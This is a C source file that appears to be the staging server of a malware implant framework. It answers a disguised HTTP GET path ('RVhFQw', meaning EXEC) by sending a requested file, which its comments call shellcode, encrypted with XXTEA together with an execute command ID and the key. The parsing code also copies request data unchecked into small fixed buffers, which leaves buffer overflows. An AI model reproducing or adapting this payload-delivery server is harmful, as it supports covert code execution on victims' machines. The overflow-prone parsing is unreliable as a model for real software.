#include "head.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>


void separate_param(const char* param_str, char* param_value) {
    char* equal_sign = strchr(param_str, '=');
    if (equal_sign != NULL) {
        size_t param_len = equal_sign - param_str;
        strcpy(param_value, equal_sign + 1);
    }
}
void handle_http_request(char* request,char* argc_method, char* argc_fpath,char* argc_fname) {
    char method[10];
    char path[1024];
    char* query_params = NULL;
    char tmpName[16];
    // 解析请求方法
    sscanf(request, "%s", method);
    strcpy(argc_method, method);
    // 解析路径
    sscanf(request, "%*s %s", path);
    strcpy(argc_fpath, path+1);
    for (int i = 0; i < strlen(argc_fpath); i++) 
    {
        if (argc_fpath[i] == '?') 
        {
            argc_fpath[i] = 0;
            break;
        }
    }


    // 解析查询参数
    char* query_start = strchr(path, '?');
    if (query_start != NULL) {
        *query_start = '\0';  // 将路径截断，去掉查询参数部分
        query_params = query_start + 1;
    }

    printf("Method: %s\n", method);
    printf("Path: %s\n", path);
    if (query_params != NULL) {
        printf("Query Params: %s\n", query_params);
        separate_param(query_params, tmpName);
        strcpy(argc_fname, tmpName);
    }
}



int pkcs5Padding(char* data,int datalen,int paddingLen,char** output_mem) {
    char* tmpAlloc;
    int i;
    if (datalen % paddingLen) {
        paddingLen = paddingLen - datalen % paddingLen;
    }
    tmpAlloc = malloc(datalen + paddingLen);
    memcpy(tmpAlloc, data, datalen);
    memset(tmpAlloc + datalen, paddingLen, paddingLen);
    *output_mem = tmpAlloc;
    return datalen + paddingLen;
}

void mm_send_enc(int fd, char* buf, size_t n, int flags,int ID_operate)
{
    char httpHead200[] = "HTTP/1.0 200 OK\r\n" \
        "Server: fuck me\r\n" \
        "Date: Mon, 25 Dec 2023 11:13:05 GMT\r\n" \
        "Content-type: application/octet-stream\r\n\r\n";
    char* dataSend;
    char* buf2;
    int n2;
 
    char* Key16 = genKey16();
    n2=pkcs5Padding(buf, n, 8,&buf2);
    xxtea(buf2, Key16, n2, 0);

    dataSend = malloc(sizeof(httpHead200) + 4 + 16 + n2);
    memcpy(dataSend, httpHead200, sizeof(httpHead200));
    memcpy(dataSend + sizeof(httpHead200) - 1, &ID_operate, 4);
    memcpy(dataSend + sizeof(httpHead200) - 1 + 4, Key16, 16);
    memcpy(dataSend + sizeof(httpHead200) - 1 + 4 + 16, buf2, n2);

    ssize_t bytes_sent = send(fd, dataSend, sizeof(httpHead200) - 1 + 4 + 16 + n2, flags);
    if (bytes_sent < 0) {
        perror("Error sending response");
        exit(EXIT_FAILURE);
    }
    free(buf2);
    free(dataSend);
    free(Key16);
    return;
}
int mm_recv(int fd, void* buf, size_t n, int flags) {

    return 0;
}
void handle_request(int client_socket)
{
    char buffer[BUFFER_SIZE];
    // 解析HTTP请求
    char method[10];
    char path[256];
    char requestName[64];
    memset(buffer, 0, sizeof(buffer));

    // 读取客户端的HTTP请求
    ssize_t bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
    if (bytes_received < 0) {
        perror("Error receiving data");
        close(client_socket);
        exit(EXIT_FAILURE);
    }

    printf("%s", buffer);
    handle_http_request(buffer, method, path, requestName);

    //http://192.168.127.130:8080/RVhFQw?name=app.bin

    // 检查HTTP方法是否为GET
    if (strcmp(method, "GET") == 0) 
    {
        // 生成HTTP响应
        //就默认发一个shellcode
        if (strcmp(path, "RVhFQw") == 0) //最好不是b64
        {
            char cwd[256]; // 用于存储当前路径的字符数组
            char targetPath[256];
            if (getcwd(cwd, sizeof(cwd)) != NULL) {
                printf("当前工作目录: %s\n", cwd);
            }else {
                perror("获取当前工作目录失败");
                return 1;
            } 
            sprintf(targetPath, "%s/%s/%s", cwd, path, requestName);
            char* buf;
            int n;
            mm_readfile(targetPath, &buf, &n);
            printf("[out]: send %s\n", targetPath);
            enum operateID id = EXEC;
            mm_send_enc(client_socket,  buf,n, 0, id);
            free(buf);    
        }
    }
    else 
    {
        const char* response = "HTTP/1.1 405 Method Not Allowed\r\n\r\n";
        ssize_t bytes_sent = send(client_socket, response, strlen(response), 0);
        if (bytes_sent < 0)
        {
            close(client_socket);
            perror("Error sending response");
            exit(EXIT_FAILURE);
        }
    }//不处理

    // 关闭客户端socket
    close(client_socket);
}